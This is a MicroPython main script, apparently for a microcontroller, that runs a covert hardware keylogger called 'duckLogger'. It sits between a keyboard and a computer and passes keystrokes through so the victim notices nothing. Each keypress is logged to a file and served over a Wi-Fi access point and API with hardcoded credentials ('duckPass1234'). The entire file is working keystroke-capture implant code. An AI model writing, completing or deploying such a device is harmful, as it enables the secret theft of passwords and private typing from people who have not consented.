from machine import Pin
import neopixel
import time


PIN_NUM = 48  
NUM_LEDS = 1

np = neopixel.NeoPixel(Pin(PIN_NUM), NUM_LEDS)

for _ in range(5):
    np[0] = (0, 255, 0)  # ON
    np.write()
    time.sleep(0.2)

    np[0] = (0, 0, 0)        # OFF
    np.write()
    time.sleep(0.2)

# main
from machine import UART
from uart_buffer import UARTBuffer
from key_led import KeyboardLED
from logger import Log
from keyboard import Keyboard
import asyncio

uart = UART(1, baudrate=115200, tx=Pin(2), rx=Pin(1) )

buffer = UARTBuffer(uart)
led = KeyboardLED(uart)
log = Log(20_000, led) # flush to file when there's 20,000 char in the buffer
kbd = Keyboard()

from access_point import AccessPoint
from api import DuckLoggerAPI
ap = AccessPoint("duckLogger", "duckPass1234")
ap.start()

async def main():
    api = DuckLoggerAPI()
    asyncio.create_task(api.start_server())
    last_activity = time.ticks_ms()

    while True:
        if time.ticks_diff(time.ticks_ms(), last_activity) >= 10_000:
            log._flush()
            last_activity = time.ticks_ms()


        if not uart.any():
            await asyncio.sleep(0)
            continue


        frame = await buffer.get_frame()

        led.update_led(frame)
        kbd.emulate(frame)

        modifiers = kbd.get_modifiers(frame)
        keys = kbd.get_keys(frame)
        log.add(modifiers, keys)

        last_activity = time.ticks_ms()


asyncio.run(main())
